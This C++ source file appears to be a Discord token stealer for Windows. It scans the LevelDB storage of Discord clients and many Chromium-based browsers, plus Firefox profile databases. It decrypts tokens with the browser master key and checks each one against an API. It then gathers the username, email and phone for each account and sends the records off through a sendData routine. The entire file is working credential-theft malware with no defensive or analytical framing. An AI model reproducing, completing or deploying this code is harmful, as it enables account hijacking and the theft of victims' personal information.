#include "sock.h"
#include "tkn.h"
#include "json.h"

#define MAX_USERS 100

char C_APPDATA[MAX_PATH];
char C_ROAMING[MAX_PATH];
char* jsonResult = NULL;
int userCount = 0;
const char* keyArr[] = { "id", "username", "email", "phone" };
size_t arrSize = sizeof(keyArr) / sizeof(keyArr[0]);
std::regex a_regex(R"([a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{25,110})"); 

bool checkApp(std::filesystem::path &lsp, const std::string name, const std::string path, std::string roaming)
{
    if (path.find("cord") != std::string::npos) {
        //std::transform(name.begin(), name.end(), name.begin(), [](unsigned char c) { return std::tolower(c);  });
        std::string lcD = name;
        std::transform(lcD.begin(), lcD.end(), lcD.begin(), ::tolower);
        /*
        std::string lS = roaming + "\\" + lcD + "\\Local State";
        if (!std::filesystem::exists(lS)) {
            continue;
        }*/
        lsp = std::filesystem::path(roaming) / lcD / "Local State";
        return true;
    }
    else {
        return false;
    }
}

bool checkFirefox(std::string roaming)
{
    if (std::filesystem::exists(roaming + "\\Mozilla\\Firefox\\Profiles")) {
        return true;
    }
    return false;
}

int checkDupes(UserData *userInfo, const char *tk)
{
    for (int i = 0; i < userCount; i++)
    {
        if (strcmp(tk, userInfo[i].tkn) == 0)
        {
            return 1; //true, dupe exists
        }
    }
    return 0; // false, dupe dont exist
}

void firefox_recursive_walk(const std::filesystem::path& directory, UserData *userInfo) {
    std::smatch match;
    for (const auto& entry : std::filesystem::directory_iterator(directory)) {
        if (entry.is_directory()) {
            //std::cout << "Current directory: " << entry.path() << std::endl;
            firefox_recursive_walk(entry.path(), userInfo); //Recursive call for subdirectories
        }
        else if (entry.is_regular_file()) {
            if (entry.path().extension() == ".sqlite") {
                std::ifstream file(entry.path(), std::ios::binary);
                if (file.is_open())
                {
                    std::string line;
                    while (std::getline(file, line))
                    {
                        if (std::regex_search(line, match, a_regex))
                        {
                            for (auto& t : match) {
                                
                                if (validTkn((std::string(t).c_str()), &jsonResult) == 1)
                                {
                                    std::string tk = (std::string)t;
                                    if (checkDupes(userInfo, tk.c_str()) == 0)
                                    {
                                        //std::cout << "Valid Token: " << t << std::endl; 
                                        //system("pause");
                                        JsonObject jsonObj = parse_json(jsonResult);
                                        jsonFindValues(keyArr, jsonObj, arrSize, userInfo, userCount);
                                        free(jsonResult);
                                        //std::cout << jsonResult << std::endl;
                                        strcpy_s(userInfo[userCount].tkn, sizeof(userInfo->tkn), tk.c_str());
                                        strcpy_s(userInfo[userCount].platform, sizeof(userInfo->platform), "Firefox");
                                        userCount++;
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}

void getTkns(std::string appdata, std::string roaming, UserData *userInfo)
{

    std::regex regenc("dQw4w9WgXcQ:[^\"]*");
    std::smatch match;

    std::map<std::string, std::string> paths = {
        { "Discord", roaming + "\\discord\\Local Storage\\leveldb\\" },
        { "Discord Canary", roaming + "\\discordcanary\\Local Storage\\leveldb\\" },
        { "Lightcord", roaming + "\\Lightcord\\Local Storage\\leveldb\\" },
        { "Discord PTB", roaming + "\\discordptb\\Local Storage\\leveldb\\" },
        { "Opera", roaming + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\" },
        { "Opera GX", roaming + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\" },
        { "Amigo", appdata + "\\Amigo\\User Data\\Local Storage\\leveldb\\" },
        { "Torch", appdata + "\\Torch\\User Data\\Local Storage\\leveldb\\" },
        { "Kometa", appdata + "\\Kometa\\User Data\\Local Storage\\leveldb\\" },
        { "Orbitum", appdata + "\\Orbitum\\User Data\\Local Storage\\leveldb\\" },
        { "CentBrowser", appdata + "\\CentBrowser\\User Data\\Local Storage\\leveldb\\" },
        { "7Star", appdata + "\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\" },
        { "Sputnik", appdata + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\" },
        { "Vivaldi", appdata + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\" },
        { "Chrome SxS", appdata + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\" },
        { "Chrome", appdata + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\" },
        { "Chrome1", appdata + "\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\" },
        { "Chrome2", appdata + "\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\" },
        { "Chrome3", appdata + "\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\" },
        { "Chrome4", appdata + "\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\" },
        { "Chrome5", appdata + "\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\" },
        { "Epic Privacy Browser", appdata + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\" },
        { "Microsoft Edge", appdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\" },
        { "Uran", appdata + "\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\" },
        { "Yandex", appdata + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\" },
        { "Brave", appdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\" },
        { "Iridium", appdata + "\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\" }
    };

    for (const auto& entry : paths) {

        const std::string& name = entry.first;
        const std::string& path = entry.second;
        std::filesystem::path lsp;
        if (!std::filesystem::exists(path)) {
            continue;
        }

        //std::this_thread::sleep_for(std::chrono::milliseconds(500));

        for (const auto& file_name : std::filesystem::directory_iterator(path)) {
            if (file_name.path().extension() != ".log" && file_name.path().extension() != ".ldb") {
                continue;
            }

            std::ifstream file(file_name.path(), std::ios::binary);
            std::string line;

            while (std::getline(file, line)) {

                if (checkApp(lsp, name, path, roaming) == true)
                {
                    if (std::regex_search(line, match, regenc)) {
                        for (auto& t : match)
                        {
                            std::string tkn = t.str().substr(12);
                            std::vector<uint8_t> master_key = get_master_key(lsp.string());
                            std::vector<uint8_t> buffer = base64DecodeToBytes(tkn);
                            std::string decryptedValue = decryptValue(buffer, master_key);
                            //std::cout << name << ": " << decryptedValue << std::endl;
                            if (validTkn(decryptedValue.c_str(), &jsonResult) == 1)
                            {
                                if (checkDupes(userInfo, decryptedValue.c_str()) == 0) {
                                    std::string tk = (std::string)decryptedValue;
                                    JsonObject jsonObj = parse_json(jsonResult);
                                    jsonFindValues(keyArr, jsonObj, arrSize, userInfo, userCount);
                                    free(jsonResult);
                                    strcpy_s(userInfo[userCount].tkn, sizeof(userInfo->tkn), tk.c_str());
                                    strcpy_s(userInfo[userCount].platform, sizeof(userInfo->platform), name.c_str());
                                    //std::cout << jsonResult << std::endl;
                                    userCount++;
                                }
                            }
                        }
                    }
                }
                else {
                    if (std::regex_search(line, match, a_regex)) {
                        for (auto& t : match)
                        {
                            //if (validTkn((std::string)t) == true)
                            //std::cout << name << ": " << t << std::endl;
                            std::string tk = (std::string)t;
                            if (validTkn(tk.c_str(), &jsonResult) == 1)
                            {
                                if (checkDupes(userInfo, tk.c_str()) == 0) {
                                    //std::cout << jsonResult << std::endl;
                                    JsonObject jsonObj = parse_json(jsonResult);
                                    jsonFindValues(keyArr, jsonObj, arrSize, userInfo, userCount);
                                    free(jsonResult);
                                    strcpy_s(userInfo[userCount].tkn, sizeof(userInfo->tkn), tk.c_str());
                                    strcpy_s(userInfo[userCount].platform, sizeof(userInfo->platform), name.c_str());
                                    userCount++;
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}


void InitStl()
{
    
    UserData userInfo[MAX_USERS];

    if (!GetEnvironmentVariable("LOCALAPPDATA", C_APPDATA, MAX_PATH) > 0)
    {
        std::cout << "Error: Local appdata";
    }

    if (!GetEnvironmentVariable("APPDATA", C_ROAMING, MAX_PATH) > 0)
    {
        std::cout << "Error: Roaming";
    }

    std::string appdata(C_APPDATA);
    std::string roaming(C_ROAMING);

    getTkns(appdata, roaming, userInfo);

    if (checkFirefox(roaming) == true)
    {
        firefox_recursive_walk(roaming + "\\Mozilla\\Firefox\\Profiles", userInfo);
    }

    for (int i = 0; i < userCount; i++)
    {
        if (sendData(userInfo[i]) == 1)
        {
            std::cout << "Worked wow" << std::endl;
        }
        else {
            std::cout << "fuck me" << std::endl;
        }
    }

    for (int i = 0; i < userCount; ++i) {
        std::cout << "---------------------------------" << std::endl;
        std::cout << "Token " << i + 1 << " - Token: " << userInfo[i].tkn << std::endl;
        std::cout << "Username: " << userInfo[i].username << std::endl;
        std::cout << "Email: " << userInfo[i].email << std::endl;
        std::cout << "Phone: " << userInfo[i].phone << std::endl;
        std::cout << "ID: " << userInfo[i].id << std::endl;
        std::cout << "Platform: " << userInfo[i].platform << std::endl;
    }
}